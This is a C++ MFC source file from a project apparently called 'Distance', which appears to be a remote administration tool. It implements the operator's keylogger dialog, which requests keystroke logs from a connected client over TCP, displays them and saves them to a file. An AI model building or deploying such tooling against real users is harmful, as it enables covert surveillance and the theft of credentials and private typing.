//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: KeyloggerDlg.cpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: DistanceApp.exe
//
//------------------------------------------------------------------------------

#include "pch.hpp"
#include "App.hpp"
#include "KeyloggerDlg.hpp"
#include "afxdialogex.h"


namespace Distance
{

    IMPLEMENT_DYNAMIC(KeyloggerDlg, CDialogEx)

    KeyloggerDlg::KeyloggerDlg(
        std::shared_ptr<Distance::Network::DefaultTcpServer> server,
        size_t clientID,
        CWnd* pParent /*=nullptr*/
    )
        : CDialogEx(IDD_KEYLOGGER_DIALOG, pParent),
          server_(std::move(server)),
          clientID_(clientID)
    { }

    KeyloggerDlg::~KeyloggerDlg()
    { }

    void KeyloggerDlg::DoDataExchange(CDataExchange* pDX)
    {
        CDialogEx::DoDataExchange(pDX);
        DDX_Control(pDX, IDC_KEYLOGGER_EDIT, edit_);
    }

    BEGIN_MESSAGE_MAP(KeyloggerDlg, CDialogEx)
        ON_BN_CLICKED(ID_KEYLOGGER_UPDATE, &KeyloggerDlg::OnBnClickedUpdate)
        ON_BN_CLICKED(ID_KEYLOGGER_SAVE, &KeyloggerDlg::OnBnClickedSave)
        ON_BN_CLICKED(ID_KEYLOGGER_SAVEAS, &KeyloggerDlg::OnBnClickedSaveAs)
    END_MESSAGE_MAP()

    void KeyloggerDlg::OnBnClickedUpdate()
    {
        using namespace Distance::Network;
        message_.clear();
        message_.setMsgType(MsgType::GetKeyLoggerLogs);

        // Send the query GetKeyLoggerLogs to the client
        if (!server_->send(message_, clientID_))
        {
            MessageBoxW(L"Send message to the client was failed! "
                        L"The client may have been disconnected from the server.",
                        L"Distance",
                        MB_ICONERROR);

            EndDialog(FAILED_CONNECTION_TO_CLIENT);
            return;
        }

        // Get keylogger logs from the client
        if (!server_->receive(message_, clientID_))
        {
            MessageBoxW(L"Receive message from the client was failed! "
                        L"The client may have been disconnected from the server.",
                        L"Distance",
                        MB_ICONERROR);

            EndDialog(FAILED_CONNECTION_TO_CLIENT);
            return;
        }
        if (message_.isErrorMsg())
        {
            std::string errorMsg;
            message_ >> errorMsg;
            MessageBoxError("Distance", errorMsg);
            return;
        }

        message_ >> log_;
        edit_.ReplaceSel(log_.c_str());
    }

    void KeyloggerDlg::OnBnClickedSave()
    {
        if (fileName_.empty())
        {
            OnBnClickedSaveAs();
        }
        else
        {
            std::wofstream wofs(fileName_, std::ios::trunc | std::ios::out);
            wofs << log_;
        }
    }

    void KeyloggerDlg::OnBnClickedSaveAs()
    {
        WCHAR filters[] = L"Text Files (*.txt)|*.txt|All Files (*.*)|*.*||";

        /* FALSE - save to file, TRUE - open file*/
        CFileDialog dlg(FALSE,
            L"txt",
            L"DkfltLog.txt",
            OFN_EXPLORER | OFN_OVERWRITEPROMPT,
            filters);
        if (dlg.DoModal() == IDOK)
        {
            fileName_ = dlg.m_pOFN->lpstrFile;
            std::wofstream wofs(fileName_, std::ios::trunc | std::ios::out);
            wofs << log_;
        }
    }

} // Distance
